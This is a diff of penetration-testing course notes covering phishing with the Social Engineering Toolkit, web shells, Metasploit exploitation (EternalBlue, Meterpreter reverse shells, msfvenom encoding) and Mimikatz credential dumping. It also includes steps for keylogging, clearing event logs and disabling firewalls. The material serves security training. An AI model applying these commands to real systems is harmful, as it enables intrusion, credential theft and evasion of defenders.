@@ -280,7 +280,7 @@ Source) information
   * AlientVault OTX
   * Robtex
 
-### Lesson Summary
+### Lesson 1 Summary
 
 * In this lesson we learned about:
   * The phases of reconnaissance
@@ -687,7 +687,7 @@ Option | Scan Type
 ![Nessus](./Files/Images/Lesson2/nessus6.png)
 ![Nessus](./Files/Images/Lesson2/nessus7.png)
 
-### Lesson Summary
+### Lesson 2 Summary
 
 * In this lesson we learned about:
   * Preparing custom packets for scanning
@@ -726,20 +726,509 @@ packet[TCP].dport = 135,445,80
 scripts` or `/usr/local/share/nmap/scripts`
   * Copy any libraries (`.lua files`) to the `nselib folder`
 
+___
+
 ## Exercise - Module 2, Lesson 2 – Advanced Scanning and Evasion Techniques
+
+\<Intentionally Left Blank>
+___
+___
 
 ## Exercise - Module 2, Lesson 2 – Vulnerability Scanning
 
+\<Intentionally Left Blank>
+___
+___
+
+## Module 2 — Lesson 3: Phishing, Social Engineering and Web Shells
+
+\<Intentionally Left Blank>
+___
+
+### Lesson Overview
+
+* In this lesson we will discuss:
+  * Social Engineering
+  * Social Engineering TTPs
+  * Phishing
+  * Social Engineering Toolkit (SET)
+  * Web Shells
+  * Delivery Tactics
+
+### Social Engineering
+
+* Engineering thoughts, actions, and reactions of others
+* Psychological coercion to manipulate behavior
+* Exploitation of unconscious automatic physiological mechanisms
+* Exploiting of traditions, customs, and social norms
+* Sometimes in opposition to one's self-interest
+* Cialdini's Six 'Weapons of Influence'
+  1. Reciprocation
+  2. Commitment and consistency
+  3. Social proof
+  4. Liking
+  5. Authority
+  6. Scarcity
+
+```Quote
+"Each principle is examined as to its ability to produce a distinct kind of automatic, mindless compliance from people, that is, a willingness to say yes without thinking first."
+— Robert Cialdini, Ph.D.
+```
+
+### Social Engineering TTPs
+
+* Baiting
+* Quid Pro Quo
+* Water Holing
+* Pretexting
+* Tailgaing
+* Vishing
+* Phishing
+* Spear Phishing
+* Smishing
+* Impersonations
+
+### Phishing / Spear-phishing Attacks
+
+* 9 out of 10 cyberattacks begin with an email, according to a FireEye report (September 2018). Report based on 500 million emails sent between January and June 2018.
+* Spear-phishing emails, according to a Symantec report, accounted for 7 out of 10 infection vectors by cyber attackers in 2017.
+* Steal loing Credentials
+* Spyware
+* Keyloggers
+* Viruses
+* Trojans
+* Botnet
+
+### Phishing Gone Wild
+
+* Be conscientious when creating phishing emails in an assessment. There has been cases in which the email has leaked outside its intended target.
+* *"Transformers 3' filmed in Guam goes viral
+* *Leaking High to Low
+
+### Social Engineering Toolkit
+
+* Created by TrustedSec
+* Python-based
+* Open-source
+* Penetration testing framework
+* Social engineering attacks
+* Phishing Emails
+* Various custom attack vectors
+
+### Spear-Phishing Attack Steps
+
+* Choose Spear Phishing Attack Vectors
+* Perform a Mass Email Attack
+* Other options for spear phishing
+  * Create a FileFormat Payload
+  * Create Social-Engineering Template
+  ![SET Options](./Files/Images/Lesson3/set1.png)
+* Choose from the following payloads:
+  * Flash Player Exploit
+  * PDF Exploit
+  * Buffer Overflow
+  * Stack Overflow
+  * RCE Exploit
+  * Memory Corruption
+  ![SET Payload](./Files/Images/Lesson3/set2.png)
+* Hacker IP 10.1.1.1
+* Meterpreter Memory Injection
+* Listener Port 443
+* Windows Meterpreter Reverse Shell
+* Payload via Shellcode Injection
+  ![SET Payload](./Files/Images/Lesson3/set3.png)
+* Choose from the following:
+  * Windows Address Book
+  * Microsoft Help and Support Center
+  * Wscript.exe (XP)
+  * Various Microsoft Office files
+  * Microsoft Group Converter
+  * Safari v5.o.1
+  * Firefox 3.6.O
+  * EnCase
+  * IBM License Key Admin
+  * Microsoft RDP
+  ![SET Payload](./Files/Images/Lesson3/set4.png)
+* Choose the Files Name
+* Select Single Email Attack
+  * ![SET Payload](./Files/Images/Lesson3/set5.png)
+* Use Pre-Defined Template
+* Select `'Computer Issue'`
+* Send email to: `'123click@vulnerable.com'`
+* Send from `'hack2hack@spectre.com'`
+* From name user will see: `'Poppins, Mary'`
+  * ![SET Payload](./Files/Images/Lesson3/set6.png)
+* Final product:
+* wab32res.dll
+* File ready for phishing email
+  * ![SET Payload](./Files/Images/Lesson3/set7.png)
+
+### Web Shell Defined
+
+```quote
+"A web-based script or program that gives a remote attacker unrestricted access to the host server." -D0n Quin0te, "Anatomy of a WebShell
+```
+
+```quote
+"A script that can be uploaded to a web server to enable remote admistration of the machine." -THE GRIZZLY STEPPE REPORT (Unmasking the Russian Cyber Activity)
+```
+
+### Why Web Shells
+
+* Highly effective
+* Small/easily deployed
+* Persistent remote access
+* Can fly under Administrator's radar
+* Allows privilege escalation
+* Can lead to total network compromise
+* Hard to detect when dormant
+* Often ignored because most security folks are not programmers
+* Allows for a botnet
+
+### Alert 5-314A
+
+* Compromised Web Servers and Web Shells - Threat Awareness and Guidance
+* Issued November 20th , 2015
+* Issued by Department of Homeland Security National Cybersecurity and
+Communications Integration Center's (NCCIC)
+* Describes the use of web shells as an exploitation vector
+* Highlights the seriousness and severity of APTs and criminal groups' use of web shells
+
+### Delivery Tactics
+
+* SQL Injection
+* Web App / Service Vulnerabilities (CMS)
+* Remote File Include (RFI)
+* Local File Include (LFI)
+
+### Basic Web Shell Attack
+
+![Basic Shell Attack](./Files/Images/Lesson3/shellattack.png)
+
+### Web Shell Example: weeveIy3
+
+* There are many types of web shells but we will focus on weevely3
+  * Used in post-exploitation
+  * Places a PHP agent on a target web server
+  * Backdoor Web Shell
+  * Ubiquitous
+  * File and Folder Information
+  ![Basic Shell Attack](./Files/Images/Lesson3/shellattack2.png)
+
+### Lesson 3 Summary
+
+* In this lesson we learned about:
+  * Social Engineering
+  * Social Engineering TTPs
+  * Phishing
+  * Social Engineering Toolkit (SET)
+  * Web Shells
+  * Delivery Tactics
+
+___
+
+## Exercise - Module 2, Lesson 3 – Drafting a Phishing Email to use with SET
+
+___
+
+\<Intentionally left blank>
+
+___
+
+## Exercise - Module 2, Lesson 3 – Using Social Engineering Template to Send Phishing Emails
+
+___
+
+\<Intentionally left blank>
+
+___
+
+## Exercise - Module 2, Lesson 3 – Web Shell Enumeration and Persistence
+
+___
+
+\<Intentionally left blank>
+
+___
+
+## Lesson - Module 2 — Lesson 4: Metasploit, Part 1
+
+___
+
+### Lesson 4 Overview
+
+* In this lesson we will discuss:
+  * Metasploit framework
+  * Exploit scripts
+  * Payloads
+  * Auxiliary modules
+  * Command syntax and navigation
+
+* Metasploit Framework
+  * Open source framework built on Ruby
+  * Launched with msfconsole
+  * Consists of Modules and Payloads
+  * Module Types:
+    * Exploits
+    * Auxiliary
+
+### PostgresSQL Database
+
+* Behind the scenes, Metasploit manages a PostgresSQL database.
+* This houses all the exploits and payloads used throughout the utility.
+* To check the database status, enter `db_status` inside of `msfconsole`.
+* To prepare the database, use `msfdb init` from the command-line.
+* If it is necessary, you can `msfdb reinit`!
+
+### Auxiliary Modules
+
+* Database
+* Scanners
+* Fuzzers
+* Admin Credentials
+* Encoders
+![Auxiliary Modules](./Files/Images/Lesson4/meta-aux.png)
+
+### Exploit Modules
+
+* Exploit modules include
+  * Shellcode
+  * Remote
+  * Publicly known
+* Payloads:
+  * Single Stage
+  * Multi Stage
+
+### Organization
+
+* Before you begin throwing exploits, you should prepare a workspace.
+* This is a capability to keep track of your activities and scans.
+* Usage :
+
+Command | Task
+--- | ---
+workspace | List workspaces
+workspace | List workspaces verbosely
+workspace [name] | Switch workspace
+workspace -a [name] | Add workspace(s)
+workspace -d [name] | Delete workspace(s)
+workspace -D | Delete all workspaces
+workspace -r \<old> < new> | Rename workspace
+workspace -h | Show this help information
+
+### Exploits
+
+* `search` by term or file path
+* CVE:2010 type: post
+* `post/windows/gather/`
+* `use` to enter exploit context
+* `show options` to edit exploit or set payload
+* `set` to apply a payload to be delivered
+* `show evasion` to edit delivery
+* `exploit` or `run` to attempt an attack on the target
+
+### Avoiding Slow Search
+
+* The database must be cached to stop slow searches: `db_rebuild_cache`
+  * ![Rebuild Cache](./Files/Images/Lesson4/meta-rebuild-cache.png)
+
+### Metasploit Filesystem
+
+* Subdirectories
+  * Data
+  * Documentation
+  * Lib
+  * Modules
+  * Scripts
+  * Tools
+
+### Metasploit Commands
+
+Command | Task
+--- | ---
+ back | Moves back without exiting
+ check | Must be performed from within an exploit  
+ connect | Provides limited netcat functionality
+ grep | Filter searches
+ info | Can be used from msfconsole or within a module
+ sessions | Interact with active remote connections
+ set | Set an option for an exploit or payload
+ setg | The 'g' is for global
+ help | Provides options for commands
+
+### Listeners for Pre-delivered Exploits
+
+* Found under exploit/multi/handler
+* Used when delivering payload outside of msfconsole
+* Must be running when payload is triggered on target
+* The generic listener is platform agnostic
+
+### Say you found a payload you would like
+
+* Select a payload or exploit with `use` and its name.
+  ![Use Payload](./Files/Images/Lesson4/meta-use.png)
+
+### Change the settings
+
+* To tweak the payload or exploit to your liking, start with `show options`:
+  ![Show Options](./Files/Images/Lesson4/meta-options.png)
+
+### Applying your changes
+
+* Remember, `set` and `setg` will set an option to a value.
+![Set Options](./Files/Images/Lesson4/meta-set.png)
+* `setg` is set global... this option will be set this way in all future payloads or exploits that you use!
+  * _Not just cmd/windows/bind_perl!_
+
+### You can see the raw payload
+
+* If you would like to see the raw bytes of the payload, use `generate`:
+![Payload](./Files/Images/Lesson4/meta-payload.png)
+
+### Avoid bad characters if you need to
+
+* Payloads may fail if any "bad characters" are present... remove them!
+![Bad Characters](./Files/Images/Lesson4/meta-bad-chars.png)
+
+### Specify an Encoder
+
+* The `-e` argument will let you specify an encoder.
+![Encoder](./Files/Images/Lesson4/meta-encoder.png)
+
+### Determine the payload output language
+
+* Additionally, you can choose the format of your returned payload:
+![Payload Size](./Files/Images/Lesson4/meta-payload-size.png)
+
+### Meterpreter
+
+* Metasploit interpreter
+* Payload which uses DLL injection
+* Has built-in commands as well as extensions
+* Using 'help' will list all core commands
+* Can be used to enter native Windows shell
+* Leave a session without killing it with 'background' command
+* Encrypted with TLS
+* Extensions need to be loaded into every new session
+* Post-connection exploits need a Meterpreter session number   Many post-connection exploits can also be run within a Meterpreter session
+* Refer to the help list for the 'sessions' command for reminders of how to interact with sessions
+
+### See it in Action
+
+* Say we wanted a Meterpreter session on a Windows box with the EternalBIue exploit.
+![EternalBlue](./Files/Images/Lesson4/meterpreter1.png)
+
+### Rapid Enumeration
+
+* Once you have a Meterpreter session, you can easily find information.
+![Enumeration](./Files/Images/Lesson4/meterpreter2.png)
+
+### Finding your Meterpreter session
+
+* You can determine what process your session is living inside of...
+![Session](./Files/Images/Lesson4/meterpreter3.png)
+
+### Migrate to something more stable
+
+* If the process you are living in dies, your Meterpreter session dies with it.
+![Migrate](./Files/Images/Lesson4/meterpreter4.png)
+
+### Hunt for valuable information
+
+* If you are looking for some form of files, you can search for them easily.
+![Search](./Files/Images/Lesson4/meterpreter5.png)
+
+### Download the goods
+
+* If exfiltration is in scope and not very risky, you can download files.
+![Download](./Files/Images/Lesson4/meterpreter6.png)
+
+### Start a keylogger
+
+* If you cannot find juicy info on the file system, why not try the keyboard?
+![Keylogger](./Files/Images/Lesson4/meterpreter7.png)
+
+### Cover your tracks
+
+* If you feel that you are making a lot of noise, clear the event logs!
+* Keep in mind this simply removes all the logs.
+* To a trained responder, this may look suspicious!
+![Cover Tracks](./Files/Images/Lesson4/meterpreter8.png)
+
+### Using Scripts with Meterpreter
+
+![Scripts](./Files/Images/Lesson4/meterpreter9.png)
+
+### Multicommand Script
+
+* Syntax must always begin: multicommand -cl
+  * Won't work without -cl
+* Can be used in lieu of entering Windows shell
+* As the name implies, multiple commands can be strung together
+* No functional difference from Windows shell, but the command syntax needs to be learned
+
+### post-Exploitation scripts are powerful
+
+* `run post/windows/gather/checkvm`
+  * Test to determine if this machine is a virtual machine
+* `run post/windows/gather/enum_logged_on_users`
+  * Return a list of users that are currently logged in to that machine
+* `run post/windows/gather/enum_av_excluded`
+  * Check if any directories are excluded from anti-virus scanning
+* `run post/windows/gather/enum_shares`
+  * Enumerate SMB shares that are hosted on the machine
+* _There are TONS of these scripts!_
+
+### These scripts help find new exploits
+
+* "Lester," the **l**ocal **e**xploit sugg**ester**, can determine other vulnerabilities.
+![LESTER](./Files/Images/Lesson4/meterpreter10.png)
+* You should research and become associate with many of these scripts!
+
+### I'm in — What now?
+
+* Stay within your mission scope
+* Follow ROE
+* Reconnaissance
+* Stay hidden
+* Find what is being sought after
+* Will you want to access this target again?
+* tree command is less likely to crash the system than a full system dir
+* Clean up your tracks
+
+### Target Artifacts
+
+* Meterpreter core commands are invisible
+* Windows commands are not
+* Credential injection is loud
+* Use of stolen credentials may be logged
+* Tmestomp is nice, but should be used carefully
+* Remember what you upload
+
+### Lesson 4 Summary
+
+* In this lesson we learned about:
+  * Metasploit framework
+  * Exploit scripts
+  * Payloads
+  * Auxiliary modules
+  * Command syntax and navigation
+
+___
+
 ## Exercise - Module 2, Lesson 4 – Exploiting Windows with Metasploit
+
+___
 
 1. msfdb init -> msfconsole -> db_status
 
-```Metasploit
-  * Creating database user 'msf'
-  * Creating databases 'msf'
-  * Creating database 'msf_test'
-  * Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
-```
+    ```Metasploit
+      Creating database user 'msf'
+      Creating databases 'msf'
+      Creating database 'msf_test'
+      Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
+    ```
+
 2. workspace -a Win7
 3. search platform:Windows
 4. search platform:Windows_name:reverse_tcp
@@ -753,7 +1242,7 @@ scripts` or `/usr/local/share/nmap/scripts`
 11. generate -e x86/shikata_ga_nai ->310 or 476
 12. generate -e x86/shikata_ga_nai -t bash
 13. search eternalblue
-14. use exploit/windows/smb/ms17_010_eternalblue 
+14. use exploit/windows/smb/ms17_010_eternalblue
     set RHOST 192.168.229.18
 
 15. set PAYLOAD windows/x64/meterpreter/reverse_tcp
@@ -799,46 +1288,26 @@ scripts` or `/usr/local/share/nmap/scripts`
 
 ### Msfvenom Options
 
-Option
-* Description
----
-* ---
--p
-* Payload to use
---payload-options
-* List the payload's standard options
--I [type]
-* List a module type. Options include: payloads, encoders, nops, or all
--n [length]
-* Prepend a nopsled of [length] size on to the payload
--f
-* Output format
---help-formats
-* Lit available formats
--e
-* The encoder to use
--a
-* The architecture to use
---platform
-* The platfor of the payload
---help-platforms
-* List available platforms
--s [size in bytes]
-* The maximum siz of the resulting payload
--b [x00 x01 ...]
-* The list of characters to avoid
--i [number]
-* The number of times to encode the payload
--c [input file]
-* Specify and additional win32 shellcode file to include
--x [input file]
-* Specify a custom executable file to use as a template
--o [output file]
-* Save the payload
--v
-* Specify a custom variable named to use for certain output formats
---smallest
-* Generate the smallest possible payload
+Option | Description
+--- | ---
+-p | Payload to use
+--payload-options | List the payload's standard options
+-I [type] | List a module type. Options include: payloads, encoders, nops, or all
+-n [length] | Prepend a nopsled of [length] size on to the payload
+-f | Output format
+--help-formats | List available formats
+-e | The encoder to use
+-a | The architecture to use
+--platform | The platfor of the payload
+--help-platforms | List available platforms
+-s [size in bytes] | The maximum siz of the resulting payload
+-b [x00 x01 ...] | The list of characters to avoid
+-i [number] | The number of times to encode the payload
+-c [input file] | Specify and additional win32 shellcode file to include
+-x [input file] | Specify a custom executable file to use as a template
+-o [output file] | Save the payload
+-v | Specify a custom variable named to use for certain output formats
+--smallest | Generate the smallest possible payload
 
 ___
 
@@ -871,40 +1340,24 @@ ___
 * windows Firewall Commands (netsh)
   * **NOTE:** netsh firewall is deprecated on Windows 7, Server 2008 or newer
 
-Command Purpose
-* Command (netsh firewall)
----
-* ---
-Firewall logs location
-* `%windir%\System32\Logfiles\Firewall\*`
-Enable Firewall
-* `netsh firewall set opmode enable`
-Show wireless interfaces
-* `netsh wlan show interfaces`
-Show allowed inbound ports
-* `netsh firewall show portopening`
-Show allowed programs
-* `netsh firewall show allowedprogram`
-Show firewall configuration
-* `netsh firewall show config`
-Shut down the firewall
-* `netsh firewall set opmode disable`
-Show all profiles
-* `netsh advfirewall show allprofiles`
-Turn off firewall
-* `netsh advfirewall set currentprofile state off`
-Turn on firewall
-* `netsh advfirewall set currentprofile state on`
-Open a port
-* `netsh firewall add portopening tcp 443 MyHttps`
-Remove a portopening
-* `netsh firewall delete portopening tcp 443`
-Disable ICMP
-* `netsh firewall set icmpsetting type-all`
-Open port inbound
-* `netsh advfirewall firewall add rule UDP Port 137" dir-in action-allow protocol-UDP localport=137`
-Open port Outbound
-* `netsh advfirewall firewall add rule name="NetBios UDP Port 137" dir=out action=allow protocol=UDP localport=137`
+Command Purpose | Command (netsh firewall)
+--- | ---
+Firewall logs location | `%windir%\System32\Logfiles\Firewall\*`
+Enable Firewall | `netsh firewall set opmode enable`
+Show wireless interfaces | `netsh wlan show interfaces`
+Show allowed inbound ports | `netsh firewall show portopening`
+Show allowed programs | `netsh firewall show allowedprogram`
+Show firewall configuration | `netsh firewall show config`
+Shut down the firewall | `netsh firewall set opmode disable`
+Show all profiles | `netsh advfirewall show allprofiles`
+Turn off firewall | `netsh advfirewall set currentprofile state off`
+Turn on firewall | `netsh advfirewall set currentprofile state on`
+Open a port | `netsh firewall add portopening tcp 443 MyHttps`
+Remove a portopening | `netsh firewall delete portopening tcp 443`
+Disable ICMP | `netsh firewall set icmpsetting type-all`
+Open port inbound | `netsh advfirewall firewall add rule UDP Port 137" dir-in action-allow protocol-UDP localport=137`
+Open port Outbound | `netsh advfirewall firewall add rule name="NetBios UDP Port 137" dir=out action=allow protocol=UDP localport=137`
+
 ___
 
 * Example: `netsh firewall show portopening`
@@ -1030,51 +1483,43 @@ ___
     * creds_tspkg
 * Mimikatz 2.0 (Kiwi) most common special commands (kiwi_cmd)
 
-Command
-* Purpose
----
-* ---
-CRYPTO::Certificates
-* List/export certificates
-KERBEROS::Golden
-* Create golden/silver trust tickets
-KERBEROS::List
-* List all user tickets (TGT and TGS) in user memory. No special privileges required since it only displays the current user's tickets. Similar to functionality of "klist".
-DERBEROS::PPT
-* Pass The Ticket. Typically used to inject a stolen or forged Kerberos ticket (golden/silver/trust).
-LSADUMP::DCSync
-* ask a DC to synchronize an object (get password data for account). No need to run conde on DC.
-LSADUMP::LSA
-* Ask LSA Server to retrieve SAM/AD enterprise (normal, patch on the fly or inject). Use to dump all Active Directory domain credentials from a Domain Controller or lsass.dmp dump file. Also used to get specific account crdential such as krbtgt with the parameter /name: "/name:krbtgt"
-LSADUMP::SAM
-* Get the SysKey to decrypte SAM entries (from registry or hive). The SAM option connect to the local security Account Manager (SAM) database and dumps credentials for local accounts. This is used to dump all local credentials on a Windows computer.
-LSADUMP::Trust| Ask LSA Server to retrieve Trust Auth Information (normal or patch on the fly). Dumps trust keys (passwords) for all associated trusts (domain/forest).
-MISC::AddSid| Add to SIDHistory to user account. The first value is the target account and the second value is the account/group name(s) (or SID). Moved to SID:modify as of May 6th, 2016
-MISC::MemSSP
-* Inject a malicious Windows SSP to log locally authenticated credentials.
-MISC::Skeleton
-* Inject Skeleton Key into LSASS process on Domain Controller. This enables all user authentication to the Skeleton Key patched DC to use a "master password" (aka Skeleton Keys) as well as their usual password.
-PRIVILEGE::Debug
-* Get debug rights (this or Local System rights is required for many Mimikatz commands).
-SEKURLSA::Ekeys
-* List Kerberos encryption keys
-SEKURLSA::Kerberos
-* List Kerberos credentials for all authenticated users (including services and computer account)
-SEKURLSA::Krbtgt
-* Inject Skeleton Key into LSASS process on Domain Controller. This enables all user authentication to the Skeleton Key patched DC to use a "master password" (aka Skeleton Keys) as well as their usual password.
-SEKURLSA::Pth
-* Pass- theHash and Over-Pass-the-Hash
-SEKURLSA::Tickets
-* Lists all available Kerberos tickets for all recently authenticated users, including services running under the context of a user account and the local computer's AD computer account. Unlike kerberos::list, sekurlsa uses memory reading and is not subject to key export restrictions. sekurlsa can access tickets of others sessions (users).list Kerberos encryptio keys
-TOKEN::List
-* List all tokens of a system
-TOKEN::Elevate
-* Impersonate a token. Used to elevate permissions to SYSTEM (default) or find a domain admin token on the box
-TOKEN::Elevate /domainadmin
-* Impersonate a token with Domain Admin credentials
+Command | Purpose
+--- | ---
+CRYPTO::Certificates | List/export certificates
+KERBEROS::Golden | Create golden/silver trust tickets
+KERBEROS::List | List all user tickets (TGT and TGS) in user memory. No special privileges required since it only displays the current user's tickets. Similar to functionality of "klist".
+DERBEROS::PPT | Pass The Ticket. Typically used to inject a stolen or forged Kerberos ticket (golden/silver/trust).
+LSADUMP::DCSync | ask a DC to synchronize an object (get password data for account). No need to run conde on DC.
+LSADUMP::LSA | Ask LSA Server to retrieve SAM/AD enterprise (normal, patch on the fly or inject). Use to dump all Active Directory domain credentials from a Domain Controller or lsass.dmp dump file. Also used to get specific account crdential such as krbtgt with the parameter /name: "/name:krbtgt"
+LSADUMP::SAM | Get the SysKey to decrypte SAM entries (from registry or hive). The SAM option connect to the local security Account Manager (SAM) database and dumps credentials for local accounts. This is used to dump all local credentials on a Windows computer.
+LSADUMP::Trust | Ask LSA Server to retrieve Trust Auth Information (normal or patch on the fly). Dumps trust keys (passwords) for all associated trusts (domain/forest).
+MISC::AddSid | Add to SIDHistory to user account. The first value is the target account and the second value is the account/group name(s) (or SID). Moved to SID:modify as of May 6th, 2016
+MISC::MemSSP | Inject a malicious Windows SSP to log locally authenticated credentials.
+MISC::Skeleton | Inject Skeleton Key into LSASS process on Domain Controller. This enables all user authentication to the Skeleton Key patched DC to use a "master password" (aka Skeleton Keys) as well as their usual password.
+PRIVILEGE::Debug | Get debug rights (this or Local System rights is required for many Mimikatz commands).
+SEKURLSA::Ekeys | List Kerberos encryption keys
+SEKURLSA::Kerberos | List Kerberos credentials for all authenticated users (including services and computer account)
+SEKURLSA::Krbtgt | Inject Skeleton Key into LSASS process on Domain Controller. This enables all user authentication to the Skeleton Key patched DC to use a "master password" (aka Skeleton Keys) as well as their usual password.
+SEKURLSA::Pth | Pass- theHash and Over-Pass-the-Hash
+SEKURLSA::Tickets | Lists all available Kerberos tickets for all recently authenticated users, including services running under the context of a user account and the local computer's AD computer account. Unlike kerberos::list, sekurlsa uses memory reading and is not subject to key export restrictions. sekurlsa can access tickets of others sessions (users).list Kerberos encryptio keys
+TOKEN::List | List all tokens of a system
+TOKEN::Elevate | Impersonate a token. Used to elevate permissions to SYSTEM (default) or find a domain admin token on the box
+TOKEN::Elevate /domainadmin | Impersonate a token with Domain Admin credentials
+___
+
+### Lesson 5 Summary
+
+* In this lesson we learned about:
+  * Metasploit Venom
+  * Reverse and Bind Shells
+  * Privilege Escalation
+  * Mimikatz & Kiwi Script Use
+
 ___
 
 ## Exercise - Module 2, Lesson 5 – Privilege Escalation
+
+___
 
 1. Using the Metasploit Venom payload generator and the 64-bit version of
 the Meterpreter “reverse_tcp” payload, generate a custom, executable
